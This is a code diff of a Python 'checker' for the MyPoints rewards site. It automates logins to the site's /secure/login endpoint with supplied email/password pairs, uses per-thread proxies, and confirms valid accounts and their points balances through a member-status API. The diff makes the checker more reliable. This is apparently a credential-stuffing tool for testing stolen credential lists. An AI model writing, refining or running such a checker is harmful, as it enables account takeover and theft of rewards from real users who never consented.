@@ -1,9 +1,10 @@
 """
 Checker for MyPoints (www.mypoints.com)
-Uses the /secure/login endpoint with multipart form data.
+Uses /secure/login endpoint and member-status verification.
 """
 import re
 import threading
+import time
 from typing import Tuple
 from urllib.parse import urljoin
 
@@ -17,7 +18,8 @@ BASE_URL = "https://www.mypoints.com"
 LOGIN_PAGE = BASE_URL + "/login"
 API_BASE = "https://api.mypoints.com"
 LOGIN_URL = API_BASE + "/secure/login"
-TIMEOUT = 20
+STATUS_URL = API_BASE + "/?cmd=mp-gn-member-status"
+TIMEOUT = 30
 
 def check(email: str, password: str) -> Tuple[bool, str]:
     proxy = getattr(threading.current_thread(), 'proxy', None)
@@ -40,100 +42,75 @@ def check(email: str, password: str) -> Tuple[bool, str]:
     })
 
     try:
-        # Step 1: GET login page to extract CSRF token and hidden fields
+        # Step 1: GET login page to extract hidden fields and CSRF token
         resp = session.get(LOGIN_PAGE, timeout=TIMEOUT)
         if resp.status_code != 200:
             return False, f"Failed to load login page (HTTP {resp.status_code})"
 
         html = resp.text
-        # Find the form – likely action="/secure/login" or similar
-        form_action = LOGIN_URL
-        match = re.search(r'<form[^>]*action="([^"]+)"', html, re.I)
-        if match:
-            action = match.group(1)
-            if action.startswith("/"):
-                form_action = API_BASE + action
-            elif action.startswith("http"):
-                form_action = action
 
-        # Extract hidden inputs
+        # Extract hidden form fields
         payload = {}
         hidden_pattern = r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"'
         for name, value in re.findall(hidden_pattern, html, re.I):
             payload[name] = value
 
-        # Also look for CSRF token in meta or script
+        # CSRF token from meta
         token_match = re.search(r'<meta[^>]*name="csrf-token"[^>]*content="([^"]+)"', html, re.I)
         if token_match:
             payload["_token"] = token_match.group(1)
-        else:
-            # Try common names
-            for key in ["csrf_token", "authenticity_token", "csrf"]:
-                if key in payload:
-                    break
-            else:
-                # If no token found, we still proceed (some sites don't use one)
-                pass
 
-        # Add email and password – field names might be "email", "username", or "login"
-        # Look at the login form to get exact field names
+        # Determine field names for email and password
         email_field = None
         password_field = None
-        for inp in re.findall(r'<input[^>]*name="([^"]+)"[^>]*type="([^"]+)"', html, re.I):
-            name, typ = inp
+        input_pattern = r'<input[^>]*name="([^"]+)"[^>]*type="([^"]+)"'
+        for name, typ in re.findall(input_pattern, html, re.I):
             if typ in ["email", "text"] and ("email" in name.lower() or "user" in name.lower()):
                 email_field = name
             elif typ == "password" and "password" in name.lower():
                 password_field = name
 
         if not email_field:
-            email_field = "email"  # fallback
+            email_field = "email"
         if not password_field:
-            password_field = "password"  # fallback
+            password_field = "password"
 
         payload[email_field] = email
         payload[password_field] = password
 
-        # Also add any required fixed fields like "_ajax", "pathName" etc.
-        # Often the form includes a hidden "_ajax" field
         if "_ajax" not in payload:
-            payload["_ajax"] = "1"  # many MyPoints requests use this
+            payload["_ajax"] = "1"
 
         # Step 2: POST to /secure/login
-        # The request uses multipart/form-data; requests handles that when we pass data.
-        post_resp = session.post(form_action, data=payload, allow_redirects=False, timeout=TIMEOUT)
+        login_resp = session.post(LOGIN_URL, data=payload, allow_redirects=False, timeout=TIMEOUT)
 
         # Step 3: Determine success
-        if post_resp.status_code in (301, 302):
-            location = post_resp.headers.get("Location", "").lower()
-            # After success, redirects to home page or dashboard
-            if "login" not in location and "signin" not in location:
+        if login_resp.status_code == 302:
+            location = login_resp.headers.get("Location", "").lower()
+            if "login" not in location:
                 return True, "Login successful (redirect)"
             else:
                 return False, "Login failed (redirected to login)"
 
-        # If status 200, inspect JSON response
-        if post_resp.status_code == 200:
+        if login_resp.status_code == 200:
             try:
-                data = post_resp.json()
+                data = login_resp.json()
             except:
-                return False, f"Invalid JSON response: {post_resp.text[:100]}"
+                if "invalid" in login_resp.text.lower():
+                    return False, "Invalid credentials"
+                return False, f"Unexpected response: {login_resp.text[:100]}"
 
-            # Look for success indicator
-            # Successful login might return {"status":"success"} or {"success":true}
-            if data.get("status") == "success" or data.get("success") is True:
-                return True, "Login successful (JSON)"
-            # If there's an error message
             if "error" in data:
                 return False, f"Login failed: {data['error']}"
             if "message" in data and "invalid" in data["message"].lower():
                 return False, f"Login failed: {data['message']}"
 
-            # Sometimes the response is empty on success (e.g., 200 with no body)
-            # If no error and we got a 200, assume success (but check if we are logged in)
-            # We can also call the member-status endpoint to verify
-            # Let's check the member status API to be sure
-            status_resp = session.get(API_BASE + "/?cmd=mp-gn-member-status", timeout=TIMEOUT)
+            if data.get("success") or data.get("status") == "success":
+                return True, "Login successful"
+
+            # If still uncertain, verify via member-status API
+            time.sleep(1)  # allow session to propagate
+            status_resp = session.get(STATUS_URL, timeout=TIMEOUT)
             if status_resp.status_code == 200:
                 try:
                     status_data = status_resp.json()
@@ -142,10 +119,10 @@ def check(email: str, password: str) -> Tuple[bool, str]:
                         return True, f"Login successful. Points: {points}"
                 except:
                     pass
-            # If we still don't know, treat as failure
+
             return False, "Login failed – unknown response"
 
-        return False, f"Login failed (HTTP {post_resp.status_code})"
+        return False, f"Login failed (HTTP {login_resp.status_code})"
 
     except Exception as e:
         return False, f"Request error: {str(e)}"
